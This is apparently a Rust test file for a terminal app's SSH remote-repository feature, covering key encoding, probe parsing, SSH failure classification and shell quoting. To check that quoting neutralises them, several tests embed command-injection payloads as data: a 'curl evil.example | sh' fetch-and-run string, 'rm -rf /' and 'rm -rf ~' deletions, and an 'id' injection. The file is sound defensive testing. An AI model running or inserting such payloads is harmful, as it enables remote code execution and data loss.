use std::fs;
use std::path::PathBuf;

use tempfile::tempdir;

use super::*;

#[test]
fn canonicalize_dedups_trailing_slash_variants() {
    let dir = tempdir().unwrap();
    let base = dir.path().to_path_buf();
    let with_slash = PathBuf::from(format!("{}/", base.display()));

    let a = canonicalize_repo_path(&base).unwrap();
    let b = canonicalize_repo_path(&with_slash).unwrap();
    assert_eq!(a, b);
}

#[test]
fn classify_repo_vs_folder() {
    let dir = tempdir().unwrap();
    let folder = dir.path().join("plain");
    fs::create_dir(&folder).unwrap();
    assert_eq!(classify_entry_kind(&folder), Some(RepoEntryKind::Folder));

    let repo = dir.path().join("gitrepo");
    fs::create_dir(&repo).unwrap();
    fs::create_dir(repo.join(".git")).unwrap();
    assert_eq!(classify_entry_kind(&repo), Some(RepoEntryKind::Repo));
}

#[test]
fn dead_path_check() {
    let dir = tempdir().unwrap();
    let existing = dir.path().join("exists");
    fs::create_dir(&existing).unwrap();
    assert!(!is_dead_path(&existing));

    let missing = dir.path().join("gone");
    assert!(is_dead_path(&missing));
}

#[test]
fn repo_entry_from_path_sets_display_name() {
    let dir = tempdir().unwrap();
    let path = dir.path().join("my-project");
    fs::create_dir(&path).unwrap();
    let entry = RepoEntry::from_path(&path).unwrap();
    assert_eq!(entry.display_name, "my-project");
    assert_eq!(entry.kind, RepoEntryKind::Folder);
}

fn target(server: &str, port: u16, user: &str, identity: &str, remote_path: &str) -> RemoteTarget {
    RemoteTarget {
        server: server.to_string(),
        port,
        user: user.to_string(),
        identity: identity.to_string(),
        remote_path: remote_path.to_string(),
    }
}

/// R4/AE1: the machine is part of the identity, so the same path on two hosts
/// is two entries.
#[test]
fn remote_keys_differ_by_host() {
    let a = format_remote_key("10.0.0.1", 22, "vinh", "/k", "/srv/app");
    let b = format_remote_key("10.0.0.2", 22, "vinh", "/k", "/srv/app");
    assert_ne!(a, b);
}

/// R4/AE2: a remote key can never collide with a local absolute path.
#[test]
fn remote_key_never_collides_with_local_path() {
    let remote = format_remote_key("10.0.0.1", 22, "vinh", "/k", "/srv/app");
    assert_ne!(remote, "/srv/app");
    assert!(is_remote_key(&remote));
    assert!(!is_remote_key("/srv/app"));
    assert!(!is_remote_key(r"C:\Users\v\app"));
}

#[test]
fn remote_key_round_trips_plain_components() {
    let want = target(
        "example.com",
        22,
        "vinh",
        "/Users/v/.ssh/id_ed25519",
        "/srv/app",
    );
    let key = want.key();
    assert_eq!(
        key,
        "ssh://vinh@example.com:22/srv/app?i=/Users/v/.ssh/id_ed25519"
    );
    assert_eq!(parse_remote_key(&key), Some(want));
}

/// KTD1: spaces in the identity or path must survive the key, and must not
/// arrive at the parser as raw bytes.
#[test]
fn remote_key_round_trips_spaces() {
    let want = target("h", 22, "vinh", "/Users/v/my keys/id", "/srv/my app");
    let key = want.key();
    assert!(!key.contains(' '), "space must be encoded in {key}");
    assert_eq!(parse_remote_key(&key), Some(want));
}

/// KTD1: `?`, `#`, `%`, `@` and `:` are legal in a Unix path, and R3 stores
/// whatever the host's `~`-expansion returns. An un-encoded delimiter would
/// silently yield a wrong path and a wrong identity.
#[test]
fn remote_key_round_trips_reserved_delimiters() {
    let want = target("h", 22, "us?er", "/keys/a#b%c", "/srv/a?b#c%d@e:f");
    let key = want.key();
    assert_eq!(
        key.matches('?').count(),
        1,
        "only the query delimiter may be a raw '?' in {key}"
    );
    assert_eq!(
        key.matches('@').count(),
        1,
        "only the userinfo delimiter may be a raw '@' in {key}"
    );
    assert!(!key.contains('#'), "'#' must be encoded in {key}");
    assert_eq!(parse_remote_key(&key), Some(want));
}

/// KTD1: an IPv6 host is bracketed so its colons cannot be mistaken for the
/// `:port` delimiter.
#[test]
fn remote_key_brackets_ipv6_host() {
    let want = target("::1", 2222, "root", "/k", "/srv");
    let key = want.key();
    assert_eq!(key, "ssh://root@[::1]:2222/srv?i=/k");
    assert_eq!(parse_remote_key(&key), Some(want));
}

#[test]
fn remote_key_preserves_port() {
    let default_port = parse_remote_key(&format_remote_key("h", 22, "u", "/k", "/srv")).unwrap();
    assert_eq!(default_port.port, 22);
    let custom = parse_remote_key(&format_remote_key("h", 2222, "u", "/k", "/srv")).unwrap();
    assert_eq!(custom.port, 2222);
}

#[test]
fn remote_key_round_trips_empty_identity() {
    let want = target("h", 22, "u", "", "/srv/app");
    let key = want.key();
    assert!(!key.contains('?'), "no query segment expected in {key}");
    assert_eq!(parse_remote_key(&key), Some(want));
}

#[test]
fn parse_remote_key_rejects_malformed_keys() {
    assert_eq!(parse_remote_key("/srv/app"), None);
    assert_eq!(
        parse_remote_key("ssh://example.com:22/srv"),
        None,
        "no user"
    );
    assert_eq!(parse_remote_key("ssh://u@h/srv"), None, "no port");
    assert_eq!(parse_remote_key("ssh://u@h:notaport/srv"), None);
    assert_eq!(parse_remote_key("ssh://u@h:22/sr%ZZv"), None, "bad escape");
}

/// R10: the row label is the path leaf, and the host when there is no leaf.
#[test]
fn remote_display_name_uses_path_leaf_then_host() {
    let with_leaf = parse_remote_key("ssh://u@h:22/srv/app?i=/k").unwrap();
    assert_eq!(with_leaf.display_name(), "app");
    let no_leaf = parse_remote_key("ssh://u@h:22/?i=/k").unwrap();
    assert_eq!(no_leaf.display_name(), "h");
    assert_eq!(no_leaf.user_host(), "u@h");
}

/// KTD10: an unquoted space in an identity or remote path word-splits into a
/// second positional argument, which silently drops warpification.
#[test]
fn shell_quote_wraps_and_escapes() {
    assert_eq!(shell_quote("/srv/app"), "'/srv/app'");
    assert_eq!(shell_quote("/srv/my app"), "'/srv/my app'");
    assert_eq!(shell_quote("a$b`c\\d"), "'a$b`c\\d'");
    assert_eq!(shell_quote("it's"), r#"'it'\''s'"#);
    assert_eq!(shell_quote(""), "''");
}

/// One label entry point for both kinds of registry key.
#[test]
fn registry_label_handles_local_and_remote_keys() {
    let dir = tempdir().unwrap();
    let local = dir.path().join("my-project");
    assert_eq!(display_name_for_registry_path(&local), "my-project");

    let key = format_remote_key("h", 22, "u", "/k", "/srv/app");
    assert_eq!(display_name_for_registry_path(Path::new(&key)), "app");
}

/// R9/R11: an entry with no probe yet is pending, and only a resolved probe
/// carries a kind — the local `.git` rules never answer for a remote entry.
#[test]
fn remote_probe_state_reports_kind_only_when_resolved() {
    assert_eq!(RemoteProbeState::default(), RemoteProbeState::Pending);
    assert_eq!(RemoteProbeState::Pending.kind(), None);
    assert_eq!(
        RemoteProbeState::Failed {
            reason: RemoteProbeFailure::Unreachable
        }
        .kind(),
        None
    );
    assert_eq!(
        RemoteProbeState::Resolved {
            kind: RepoEntryKind::Repo,
            branch: Some("main".to_string()),
        }
        .kind(),
        Some(RepoEntryKind::Repo)
    );
}

/// R7/KTD6: each failure class names what the user must actually do, so a
/// `BatchMode` false negative is not reported as "unreachable".
#[test]
fn remote_probe_failures_have_distinct_messages() {
    let failures = [
        RemoteProbeFailure::Unreachable,
        RemoteProbeFailure::NeedsFirstHandConnect,
        RemoteProbeFailure::PathNotFound,
        RemoteProbeFailure::SshUnavailable,
    ];
    for failure in failures {
        assert!(!failure.message().is_empty());
        assert!(!failure.short_label().is_empty());
    }
    for (index, failure) in failures.iter().enumerate() {
        for other in &failures[index + 1..] {
            assert_ne!(
                failure.message(),
                other.message(),
                "{failure:?} and {other:?} tell the user the same thing"
            );
            assert_ne!(failure.short_label(), other.short_label());
        }
    }
}

/// Covers R8/AE4: one round trip answers repo-or-folder, the branch, and the
/// host-expanded path (R3).
#[test]
fn probe_output_parses_repo_folder_and_missing() {
    assert_eq!(
        parse_probe_output("path /home/v/app\nkind repo\nbranch main\n"),
        Some(RemoteProbeOutcome::Found {
            remote_path: "/home/v/app".to_string(),
            kind: RepoEntryKind::Repo,
            branch: Some("main".to_string()),
        })
    );
    // A repository with no readable branch (detached, or no git binary) is
    // still a repository.
    assert_eq!(
        parse_probe_output("path /srv/app\nkind repo\n"),
        Some(RemoteProbeOutcome::Found {
            remote_path: "/srv/app".to_string(),
            kind: RepoEntryKind::Repo,
            branch: None,
        })
    );
    assert_eq!(
        parse_probe_output("path /srv/data\nkind folder\n"),
        Some(RemoteProbeOutcome::Found {
            remote_path: "/srv/data".to_string(),
            kind: RepoEntryKind::Folder,
            branch: None,
        })
    );
    assert_eq!(
        parse_probe_output("missing\n"),
        Some(RemoteProbeOutcome::Missing)
    );
    // A path with spaces survives the line protocol.
    assert_eq!(
        parse_probe_output("path /srv/my app\nkind folder\n"),
        Some(RemoteProbeOutcome::Found {
            remote_path: "/srv/my app".to_string(),
            kind: RepoEntryKind::Folder,
            branch: None,
        })
    );
}

/// Garbled or empty output is not silently read as "folder" — the entry has to
/// stay unresolved rather than claim a kind nothing confirmed.
#[test]
fn probe_output_rejects_unusable_stdout() {
    assert_eq!(parse_probe_output(""), None);
    assert_eq!(parse_probe_output("bash: line 1: syntax error\n"), None);
    assert_eq!(parse_probe_output("path /srv/app\n"), None, "no kind line");
}

/// Covers KTD6: `BatchMode=yes` turns an unknown host key or a locked key into
/// a non-zero exit that the *interactive* tab would sail past, so it must not
/// be reported as "unreachable".
#[test]
fn probe_failures_are_classified_by_what_the_user_must_do() {
    for stderr in [
        "Host key verification failed.",
        "vinh@10.0.0.7: Permission denied (publickey).",
        "Enter passphrase for key '/Users/v/.ssh/id_ed25519':",
        "The authenticity of host '10.0.0.7' can't be established.",
    ] {
        assert_eq!(
            classify_probe_failure(stderr),
            RemoteProbeFailure::NeedsFirstHandConnect,
            "stderr: {stderr}"
        );
    }

    for stderr in [
        "ssh: connect to host 10.0.0.7 port 22: Connection refused",
        "ssh: connect to host 10.0.0.7 port 22: Operation timed out",
        "ssh: Could not resolve hostname nope: nodename nor servname provided",
        "",
    ] {
        assert_eq!(
            classify_probe_failure(stderr),
            RemoteProbeFailure::Unreachable,
            "stderr: {stderr}"
        );
    }
}

/// A *changed* host key is not a first connection. OpenSSH prints it as its
/// man-in-the-middle warning, and its stderr also contains "host key
/// verification failed", so it has to be classified before the generic markers
/// or the user is handed setup instructions in place of a warning.
#[test]
fn a_changed_host_key_is_its_own_reason_not_a_first_connection() {
    let stderr = "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n\
                  @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\n\
                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n\
                  IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!\n\
                  Host key verification failed.";

    let reason = classify_probe_failure(stderr);
    assert_eq!(reason, RemoteProbeFailure::HostKeyChanged);
    assert_ne!(
        reason,
        RemoteProbeFailure::NeedsFirstHandConnect,
        "the generic 'host key verification failed' marker must not win"
    );

    // The advice must read as a warning, not as a setup step.
    let message = reason.message().to_ascii_lowercase();
    assert!(
        !message.contains("connect once by hand"),
        "must not tell the user to click through a MITM warning: {message:?}"
    );
    assert!(
        message.contains("verify"),
        "should tell the user to verify the new key: {message:?}"
    );
    assert_ne!(
        reason.short_label(),
        RemoteProbeFailure::NeedsFirstHandConnect.short_label()
    );
}

/// Covers KTD6/KTD10: the probe is argv, never a shell string; `--` fences the
/// destination so a `user`/`host` starting with `-` cannot become an option;
/// and the script travels over stdin rather than as a quoted remote command.
#[test]
fn probe_args_fence_the_destination_and_append_no_script() {
    let target = RemoteTarget {
        server: "10.0.0.7".to_string(),
        port: 2222,
        user: "vinh".to_string(),
        identity: "/Users/v/my keys/id".to_string(),
        remote_path: "/srv/app".to_string(),
    };
    let args = remote_probe_args(&target, 8);

    let fence = args.iter().position(|a| a == "--").expect("-- fence");
    assert_eq!(args[fence + 1], "vinh@10.0.0.7");
    assert!(args.contains(&"BatchMode=yes".to_string()));
    assert!(args.contains(&"ConnectTimeout=8".to_string()));
    assert_eq!(args[fence + 2], REMOTE_PROBE_SHELL_COMMAND);
    assert_eq!(args.len(), fence + 3, "nothing follows the shell command");

    // The identity is passed as its own argv entry: no quoting, no splitting.
    let identity = args.iter().position(|a| a == "-i").expect("-i");
    assert_eq!(args[identity + 1], "/Users/v/my keys/id");
    assert!(args.contains(&"-p".to_string()));
    assert!(args.contains(&"2222".to_string()));

    // Never weaken host-key checking to make an add-time probe pass (KTD6/S2).
    assert!(
        !args.iter().any(|a| a.contains("StrictHostKeyChecking")),
        "host-key policy must stay at its secure default: {args:?}"
    );

    // An identity-less target simply omits `-i`.
    let no_identity = RemoteTarget {
        identity: String::new(),
        ..target
    };
    assert!(!remote_probe_args(&no_identity, 8).contains(&"-i".to_string()));
}

/// KTD10: the remote path reaches a shell inside the probe script, so it is
/// shell-quoted rather than interpolated raw.
#[test]
fn probe_script_quotes_the_remote_path() {
    let path = "/srv/my app; rm -rf /";
    let script = remote_probe_script(path);
    // The path only ever appears as the single-quoted assignment, so its
    // metacharacters are data to the remote shell, never syntax.
    assert_eq!(
        script.lines().next(),
        Some(format!("p={}", shell_quote(path)).as_str())
    );
    assert_eq!(script.matches(path).count(), 1);

    // A path containing a single quote closes and reopens correctly.
    let quoted = remote_probe_script("/srv/it's");
    assert_eq!(quoted.lines().next(), Some(r#"p='/srv/it'\''s'"#));
}

/// KTD2: the local-filesystem rules must never run for a remote key.
#[test]
fn local_fs_rules_are_gated_to_local_keys() {
    let key = format_remote_key("h", 22, "u", "/k", "/srv/app");
    let remote = Path::new(&key);
    assert!(canonicalize_repo_path(remote).is_err());
    assert_eq!(classify_entry_kind(remote), None);
    // Never "dead": liveness for a remote entry comes from the probe (R11).
    assert!(!is_dead_path(remote));
}

/// Covers R13/KTD10: the tab's `ssh` line must survive Warp's own
/// warpification gate, which requires exactly one positional argument. Every
/// user-entered value therefore stays inside an option or behind the `--`
/// fence, and is quoted so neither a space nor a metacharacter can split into a
/// second positional and silently un-warpify the session.
#[test]
fn ssh_command_keeps_a_single_positional_destination() {
    let target = RemoteTarget {
        server: "10.0.0.7".to_string(),
        port: 2222,
        user: "vinh".to_string(),
        identity: "/Users/v/my keys/id".to_string(),
        remote_path: "/srv/my app".to_string(),
    };
    let command = remote_ssh_command(&target);
    assert_eq!(
        command,
        "ssh -i '/Users/v/my keys/id' -p 2222 -- 'vinh@10.0.0.7'"
    );

    // The remote path never appears on the ssh line: appending it would be the
    // second positional that costs warpification (KTD7).
    assert!(!command.contains("/srv/my app"));
    assert!(command.ends_with("'vinh@10.0.0.7'"));

    let no_identity = RemoteTarget {
        identity: String::new(),
        port: DEFAULT_SSH_PORT,
        ..target
    };
    assert_eq!(
        remote_ssh_command(&no_identity),
        "ssh -p 22 -- 'vinh@10.0.0.7'"
    );
}

/// Covers KTD10: `remote_ssh_command` is typed into the *local* shell, so a
/// metacharacter in the destination is command execution on this machine, not
/// just a word-splitting hazard. Both halves of `user@host` must be quoted —
/// the destination is the one field the `--` fence cannot protect, because the
/// fence only stops it being read as an *option*.
#[test]
fn ssh_command_quotes_metacharacters_in_the_destination() {
    let injected = RemoteTarget {
        server: "h; curl evil.example | sh".to_string(),
        port: DEFAULT_SSH_PORT,
        user: "vinh".to_string(),
        identity: String::new(),
        remote_path: "/srv/app".to_string(),
    };
    assert_eq!(
        remote_ssh_command(&injected),
        "ssh -p 22 -- 'vinh@h; curl evil.example | sh'"
    );

    // A quote in the field closes and reopens the quoting rather than escaping
    // it, so the payload stays a single inert word.
    let quoted = RemoteTarget {
        user: "v'; id; '".to_string(),
        server: "host".to_string(),
        ..injected
    };
    assert_eq!(
        remote_ssh_command(&quoted),
        r"ssh -p 22 -- 'v'\''; id; '\''@host'"
    );
}

/// Covers R12/KTD10: landing in the entry's path is its own command, and the
/// path stays one argument however it is spelled.
#[test]
fn cd_command_quotes_the_remote_path() {
    assert_eq!(remote_cd_command("/srv/app"), "cd '/srv/app'");
    assert_eq!(remote_cd_command("/srv/my app"), "cd '/srv/my app'");
    assert_eq!(
        remote_cd_command("/srv/app; rm -rf /"),
        "cd '/srv/app; rm -rf /'"
    );
    assert_eq!(remote_cd_command("/srv/it's"), r#"cd '/srv/it'\''s'"#);
    // `~` is left to the remote shell to expand — the entry stores the path the
    // host already resolved at probe time (R3), so this is only a fallback.
    assert_eq!(remote_cd_command("~/app"), "cd '~/app'");
}

/// Covers R12 with warpification off: no `WarpifiedRemote` session is created,
/// so the bootstrap the deferred `cd` waits for never fires and the tab would
/// otherwise sit in the remote home directory, silently ignoring the path the
/// user picked. The path therefore travels on the command line instead.
///
/// KTD7's trade is not being given up here — warpification is already off, so
/// the second positional costs nothing that was not already lost. The `-t` is
/// what keeps the session interactive: `ssh` allocates no pty for a command.
#[test]
fn landing_command_carries_the_path_when_nothing_else_will() {
    let target = RemoteTarget {
        server: "10.0.0.7".to_string(),
        port: 2222,
        user: "vinh".to_string(),
        identity: "/Users/v/my keys/id".to_string(),
        remote_path: "/srv/my app".to_string(),
    };

    assert_eq!(
        remote_ssh_command_landing_in_path(&target),
        r#"ssh -i '/Users/v/my keys/id' -p 2222 -t -- 'vinh@10.0.0.7' 'cd '\''/srv/my app'\''; exec "${SHELL:-/bin/sh}" -l'"#
    );

    // The warpified shape is untouched: it still carries no path and no `-t`.
    let warpified = remote_ssh_command(&target);
    assert!(!warpified.contains("/srv/my app"));
    assert!(!warpified.contains(" -t "));
}

/// KTD10 applies to the landing shape too, and one step harder: the remote path
/// crosses *two* shells. The local shell must see the whole remote command as
/// one inert word, and the remote shell must then see the path as one argument
/// to `cd` — so a payload cannot escape at either hop.
#[test]
fn landing_command_quotes_the_path_at_both_hops() {
    let injected = RemoteTarget {
        server: "host".to_string(),
        port: DEFAULT_SSH_PORT,
        user: "vinh".to_string(),
        identity: String::new(),
        remote_path: "/srv/app'; rm -rf ~; '".to_string(),
    };

    assert_eq!(
        remote_ssh_command_landing_in_path(&injected),
        concat!(
            r#"ssh -p 22 -t -- 'vinh@host' "#,
            r#"'cd '\''/srv/app'\''\'\'''\''; rm -rf ~; '\''\'\'''\'''\''; "#,
            r#"exec "${SHELL:-/bin/sh}" -l'"#
        )
    );

    // Read back what each shell would actually see, rather than trusting the
    // literal above to be right by inspection.
    let command = remote_ssh_command_landing_in_path(&injected);
    let remote_command = single_quoted_suffix(&command);
    assert_eq!(
        remote_command,
        r#"cd '/srv/app'\''; rm -rf ~; '\'''; exec "${SHELL:-/bin/sh}" -l"#
    );
    assert_eq!(
        single_quoted_prefix(&remote_command),
        injected.remote_path,
        "the remote shell must see the path as one argument to cd"
    );
}

/// Undo one layer of POSIX single-quoting on the trailing quoted word — what
/// the local shell hands `ssh` as the remote command.
fn single_quoted_suffix(command: &str) -> String {
    let start = command
        .find(" 'cd ")
        .expect("landing command ends in a quoted remote command");
    unquote(&command[start + 1..])
}

/// Undo one layer of POSIX single-quoting on the leading quoted word — what the
/// remote shell hands `cd` as its argument.
fn single_quoted_prefix(remote_command: &str) -> String {
    unquote(
        remote_command
            .strip_prefix("cd ")
            .expect("remote command starts with cd"),
    )
}

/// POSIX single-quote removal: quoted runs contribute their contents verbatim,
/// and `'\''` reduces to one literal quote. Stops at the first unquoted space or
/// `;`, either of which ends the word — that boundary is the whole point, since
/// a payload escaping its quotes would show up as extra text past it.
fn unquote(word: &str) -> String {
    let mut out = String::new();
    let mut in_quotes = false;
    let mut chars = word.chars();
    while let Some(ch) = chars.next() {
        match ch {
            '\'' => in_quotes = !in_quotes,
            '\\' if !in_quotes => out.push(chars.next().expect("trailing backslash")),
            ' ' | ';' if !in_quotes => break,
            _ => out.push(ch),
        }
    }
    out
}
